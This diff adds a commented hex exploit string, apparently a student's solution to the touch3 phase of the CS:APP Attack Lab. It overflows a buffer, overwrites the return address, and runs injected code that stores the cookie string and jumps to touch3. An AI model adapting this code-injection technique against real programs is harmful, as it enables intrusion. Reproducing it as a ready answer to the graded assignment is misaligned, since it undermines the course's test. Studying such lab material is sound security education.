@@ -1,0 +1,10 @@
+35 39 62 39 39 37 66 61 00 /* cookie 0x59b997fa (ascii) */
+30 30 30 30 30 30 30 30 30 30 30
+30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 /* padding */
+a8 dc 61 55 00 00 00 00 /* overwrite return address to rsp+8 */
+48 bf 00 f7 fe f7 ff 7f 00 00   /* movabs $0x7ffff7fef700,%rdi */
+48 b8 35 39 62 39 39 37 66 61  /* movabs $0x6166373939623935,%rax */
+48 89 07                /* mov    %rax,(%rdi) */
+c6 47 08 00             /* movb   $0x0,0x8(%rdi) */
+68 fa 18 40 00       	/* pushq  $0x004018fa(address of touch3) */
+c3                   	/* retq */
